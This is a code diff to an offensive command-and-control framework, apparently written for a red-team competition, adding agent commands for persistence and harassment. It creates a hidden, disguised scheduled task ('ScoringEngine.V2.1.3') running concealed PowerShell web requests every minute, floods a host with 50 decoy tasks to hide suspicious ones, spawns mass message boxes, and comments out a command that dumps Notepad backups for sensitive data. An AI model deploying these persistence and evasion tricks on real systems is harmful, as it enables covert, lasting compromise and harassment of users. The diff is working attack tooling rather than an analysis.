@@ -389,58 +389,99 @@ class LateralMovement(BaseCommand):
 ######################################
 # 9. DK Conquest - Ping Machine
 ######################################
-class ScheduledTaskPingPersistence(BaseCommand):
-    command_name = "scheduled_task_ping_persistence"
+class CurlScoringEndpoint(BaseCommand):
+    command_name = "schtask_curl_scoring_endpoint"
     command_help = (
-        "\tUsage: `scheduled_task_ping_persistence <target_host>`\n"
-        "\tSchedules a task to ping a target host every 30 seconds.\n"
-        "\tThe task will run at logon with high privileges and immediately after creation."
+        "\tUsage: `schtask_curl_scoring_endpoint`\n"
+        "\tCurls scoring endpoint every 1 minute via scheduled task- RYAN SET THE TEAM NUMBER IN THE SCRIPT IF YOU HAVENT YET\n"
     )
 
     def __init__(self, command, args_list, agent_id):
         super().__init__(command, args_list, agent_id)
-        if len(args_list) < 1:
-            raise ValueError("Usage: scheduled_task_ping_persistence <target_host>")
-        self.target_host = args_list[0]
         self.agent_class = BaseAgent(agent_id)
 
     def run(self):
         try:
             # Create a task to ping the target every 30 seconds and also start it immediately
             schedule_cmd = (
-                f'shell schtasks /create /tn "PingTaskEvery30Seconds" /tr "ping {self.target_host} -n 1" '
-                "/sc onlogon /rl highest /f /st 00:00 /du 9999:59:59 /sc minute /mo 1"
+                'shell schtasks /create /sc minute /mo 1 /tn "ScoringEngine.V2.1.3" '
+                '/tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \\"Invoke-WebRequest -UseBasicParsing http://10.30.0.100/persist/teamX\\"" '
             )
+
+            # test to see if works
+            # schedule_cmd = (
+            #     'shell schtasks /create /sc minute /mo 1 /tn "ScoringEngine.V2.1.3" '
+            #     '/tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \\"Invoke-WebRequest -UseBasicParsing http://127.0.0.1:8000/persist/teamX\\"" '
+            # )
+            run_task = 'shell schtasks /run /tn "ScoringEngine.V2.1.3"'
+
+            # allows to run when on batteries
+            # set_task_cmd = (
+            #     "shell powershell.exe -NoProfile -Command \"Set-ScheduledTask -TaskName 'ScoringEngine.V2.1.3' "
+            #     '-Settings (New-ScheduledTaskSettingsSet -DisallowStartIfOnBatteries:$false)"'
+            # )
+
             # Enqueue the command to create the task
             schedule_id = self.agent_class.enqueue_command(schedule_cmd)
-            time.sleep(1)
-            # Get the response for the scheduled task creation
-            schedule_resp = self.agent_class.get_one_command_and_response(
-                schedule_id
-            ).get("response", "")
-
-            if "error" in schedule_resp.lower():
-                raise Exception("Scheduling ping task failed: " + schedule_resp)
-
-            # After the task is created, immediately run the task
-            run_cmd = 'shell schtasks /run /tn "PingTaskEvery30Seconds"'
-            run_id = self.agent_class.enqueue_command(run_cmd)
-            time.sleep(1)
-            run_resp = self.agent_class.get_one_command_and_response(run_id).get(
-                "response", ""
-            )
-
-            if "error" in run_resp.lower():
-                raise Exception("Running ping task immediately failed: " + run_resp)
-
-            print(
-                "Scheduled task to ping target every 30 seconds established and run immediately."
-            )
-            self.agent_class.store_response(schedule_id, schedule_resp)
-            self.agent_class.store_response(run_id, run_resp)
+            time.sleep(1)  # artificial delay to make sure this gets in there first
+            # just running the task right away
+            self.agent_class.enqueue_command(run_task)
 
         except Exception as e:
             print("ScheduledTaskPingPersistence encountered an error:", e)
+
+
+######################################
+# 9. DK Conquest - Scheduled Task waterfall
+######################################
+class TaskWaterfall(BaseCommand):
+    command_name = "task_waterfall"
+    command_help = (
+        "\tUsage: `task_waterfall`\n"
+        "\tCreates X amount of scheduled tasks named 'ManYouHaveProbablyBeenHacked_NUMBER' - meant to be annoying/hide sus tasks\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        try:
+            # Create a task to ping the target every 30 seconds and also start it immediately
+            for i in range(0, 50):
+                schedule_cmd = (
+                    f'shell schtasks /create /sc minute /mo 1 /tn "ManYouHaveProbablyBeenHacked_{i}" '
+                    '/tr "powershell.exe -NoProfile -WindowStyle Hidden -Command \\"echo HACKED"\\"" '
+                )
+
+                # Enqueue the command to create the task
+                schedule_id = self.agent_class.enqueue_command(schedule_cmd)
+
+        except Exception as e:
+            print("ScheduledTaskPingPersistence encountered an error:", e)
+
+
+class MessageBoxWaterfall(BaseCommand):
+    command_name = "message_box_waterfall"
+    command_help = (
+        "\tUsage: `message_box_waterfall <title> <box_content> <number_of_boxes: INT>`\n"
+        "\tSpawns X number of message boxes with title and content. User has to click `ok` on all of them :)\n"
+    )
+
+    def __init__(self, command, args_list, agent_id):
+        super().__init__(command, args_list, agent_id)
+        if len(args_list) < 3:
+            raise ValueError("need 3 args")
+        self.title = args_list[0]
+        self.content = args_list[1]
+        self.num_of_boxes = int(args_list[2])
+        self.agent_class = BaseAgent(agent_id)
+
+    def run(self):
+        for i in range(0, self.num_of_boxes):
+            cmd = f"messagebox {self.title} {self.content}"
+            self.agent_class.enqueue_command(cmd)
 
 
 ######################################
@@ -581,35 +622,35 @@ class RDP(BaseCommand):
             print("RDP encountered an error:", e)
 
 
-######################################
-# 10. Ops - Dump Notepad
-######################################
-class DumpNotepad(BaseCommand):
-    command_name = "dump_notepad"
-    command_help = (
-        "\tUsage: `dump_notepad`\n"
-        "\tDumps notepad backups, which may hold sensitive info\n"
-    )
+# ######################################
+# # 10. Ops - Dump Notepad
+# ######################################
+# class DumpNotepad(BaseCommand):
+#     command_name = "dump_notepad"
+#     command_help = (
+#         "\tUsage: `dump_notepad`\n"
+#         "\tDumps notepad backups, which may hold sensitive info\n"
+#     )
 
-    def __init__(self, command, args_list, agent_id):
-        super().__init__(command, args_list, agent_id)
-        self.agent_class = BaseAgent(agent_id)
+#     def __init__(self, command, args_list, agent_id):
+#         super().__init__(command, args_list, agent_id)
+#         self.agent_class = BaseAgent(agent_id)
 
-    def run(self):
-        notepad_dir = "C:\\Users\\ryan\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
-        try:
-            list_backup_files_command = (
-                f"shell powershell -c 'ls {notepad_dir} -File -Name'"
-            )
+#     def run(self):
+#         notepad_dir = "C:\\Users\\ryan\AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe\LocalState\TabState"
+#         try:
+#             list_backup_files_command = (
+#                 f"shell powershell -c 'ls {notepad_dir} -File -Name'"
+#             )
 
-            # execute now
-            id = self.agent_class.enqueue_command(list_backup_files_command)
-            while self.agent_class.get_one_command_and_response(id) == None:
-                print("waiting on response")
-                time.sleep(0.5)
+#             # execute now
+#             id = self.agent_class.enqueue_command(list_backup_files_command)
+#             while self.agent_class.get_one_command_and_response(id) == None:
+#                 print("waiting on response")
+#                 time.sleep(0.5)
 
-            print("DONE")
-            print(self.agent_class.get_one_command_and_response(id))
+#             print("DONE")
+#             print(self.agent_class.get_one_command_and_response(id))
 
-        except Exception as e:
-            print("RDP encountered an error:", e)
+#         except Exception as e:
+#             print("RDP encountered an error:", e)
